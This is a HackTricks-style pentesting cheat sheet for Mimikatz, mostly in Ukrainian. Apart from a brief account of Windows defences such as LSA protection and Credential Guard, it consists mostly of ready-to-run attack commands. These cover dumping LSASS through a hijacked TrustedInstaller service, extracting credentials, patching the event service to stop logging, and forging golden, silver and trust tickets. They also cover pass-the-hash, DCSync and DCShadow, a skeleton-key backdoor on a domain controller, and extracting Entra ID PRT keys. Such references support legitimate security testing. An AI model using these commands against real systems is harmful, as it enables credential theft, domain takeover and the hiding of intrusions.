# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ця сторінка базується на сторінці з [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Перевірте оригінал для додаткової інформації!

## LM and Clear-Text in memory

Починаючи з Windows 8.1 та Windows Server 2012 R2, було впроваджено значні заходи для захисту від викрадення облікових даних:

- **LM hashes and plain-text passwords** більше не зберігаються в пам’яті для підвищення безпеки. Потрібно налаштувати конкретний параметр реєстру, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ зі значенням DWORD `0`, щоб вимкнути Digest Authentication і гарантувати, що паролі у "clear-text" не кешуються в LSASS.

- **LSA Protection** запроваджено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам’яті та інжекції коду. Це досягається шляхом позначення LSASS як захищеного процесу. Активація LSA Protection включає:
1. Зміна реєстру в _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ шляхом встановлення `RunAsPPL` у `dword:00000001`.
2. Впровадження Group Policy Object (GPO), яке примусово застосовує цю зміну реєстру на керованих пристроях.

Попри ці захисти, такі інструменти, як Mimikatz, можуть обходити LSA Protection за допомогою спеціальних драйверів, хоча такі дії, ймовірно, будуть записані в event logs.

На сучасних робочих станціях це має ще більше значення, оскільки **Credential Guard увімкнено за замовчуванням на багатьох Windows 11 22H2+ та Windows Server 2025 доменно приєднаних системах, що не є DC**, тоді як **LSASS-as-PPL увімкнено за замовчуванням на нових інсталяціях Windows 11 22H2+**. На практиці це означає, що `sekurlsa::logonpasswords` часто дає менше матеріалу, ніж очікували старі techniques, і оператори дедалі частіше переходять до **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)** або модулів, орієнтованих на **CloudAP/PRT**. Зі сторони захисту дивіться [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Адміністратори зазвичай мають SeDebugPrivilege, що дає змогу налагоджувати програми. Цю привілею можна обмежити, щоб запобігти несанкціонованим memory dumps, поширеній техніці, яку використовують атакувальники для вилучення облікових даних з пам’яті. Однак навіть із вилученою цією привілеєю обліковий запис TrustedInstaller все ще може виконувати memory dumps за допомогою customized service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Це дає змогу вивантажити пам’ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі, щоб витягти credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Підробка event log у Mimikatz складається з двох основних дій: очищення event logs і patching `Event` service, щоб запобігти запису нових подій. Нижче наведено команди для виконання цих дій:

#### Clearing Event Logs

- **Command**: Ця дія спрямована на видалення event logs, що ускладнює відстеження malicious activities.
- Mimikatz не надає прямої команди в стандартній документації для очищення event logs безпосередньо через command line. Однак маніпуляції з event log зазвичай передбачають використання системних tools або scripts поза межами Mimikatz для очищення окремих logs (наприклад, за допомогою PowerShell або Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Ця experimental command призначена для зміни поведінки Event Logging Service, фактично запобігаючи запису нових events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` гарантує, що Mimikatz працює з необхідними privileges для модифікації system services.
- Команда `event::drop` після цього patching сервісу Event Logging.

### Kerberos Ticket Attacks

Використовуйте команди нижче як швидке нагадування про syntax. Окремі сторінки для [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) і [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) містять актуальні нюанси щодо AES/PAC/opsec.

### Golden Ticket Creation

Golden Ticket дозволяє impersonation для всього domain. Ключова команда та parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Ім'я domain.
- `/sid`: Security Identifier (SID) domain.
- `/user`: Ім'я користувача для impersonate.
- `/krbtgt`: NTLM hash облікового запису служби KDC domain.
- `/ptt`: Безпосередньо injects ticket у memory.
- `/ticket`: Зберігає ticket для подальшого використання.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Створення Silver Ticket

Silver Tickets надають доступ до конкретних сервісів. Ключова команда та параметри:

- Command: Подібна до Golden Ticket, але націлена на конкретні сервіси.
- Parameters:
- `/service`: Сервіс для цілі (наприклад, cifs, http).
- Інші параметри подібні до Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Створення Trust Ticket

Trust Tickets використовуються для доступу до ресурсів між доменами шляхом використання trust relationships. Ключова команда і параметри:

- Command: Подібно до Golden Ticket, але для trust relationships.
- Parameters:
- `/target`: FQDN цільового домену.
- `/rc4`: NTLM hash облікового запису trust.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Додаткові Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Lists all Kerberos tickets for the current user session.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Injects Kerberos tickets from cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Allows using a Kerberos ticket in another session.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Clears all Kerberos tickets from the session.
- Useful before using ticket manipulation commands to avoid conflicts.

### Over-Pass-the-Hash / Pass-the-Key

If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` повторно використовує поточний процес замість запуску нової консолі, що зручно, коли ви хочете одразу виконати щось на кшталт `lsadump::dcsync` у тому ж контексті.

### Active Directory Tampering

- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляції об’єктами AD. Див. [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітувати DC, щоб запросити дані паролів. Див. [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Витягти credentials з LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітувати DC, використовуючи дані пароля облікового запису комп’ютера.

- _У оригінальному контексті не наведено конкретної команди для NetSync._

- **LSADUMP::SAM**: Отримати доступ до локальної бази SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифрувати secrets, збережені в реєстрі.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановити новий NTLM hash для користувача.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримати інформацію про trust authentication.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

На хостах **Entra ID** або **hybrid-joined**, `sekurlsa::cloudap` може показати кешовані дані **Primary Refresh Token (PRT)** з LSASS. Якщо пов’язаний Proof-of-Possession key має software-protected захист, `dpapi::cloudapkd` може вивести clear/derived key material, потрібний для подальших **Pass-the-PRT** workflows.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
This стає значно складнішим, коли ключ прив’язаний до TPM, але це варто перевіряти на hybrid endpoints, тому що кешовані дані CloudAP можуть бути цікавішими за класичний вивід `wdigest`. Для cloud-side abuse chain див. [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inject backdoor into LSASS on a DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Acquire backup rights.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtain debug privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Change SID and SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No specific command for modify in original context._

- **TOKEN::Elevate**: Impersonate tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Allow multiple RDP sessions.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: List TS/RDP sessions.
- _No specific command provided for TS::Sessions in original context._

### Vault

- Extract passwords from Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
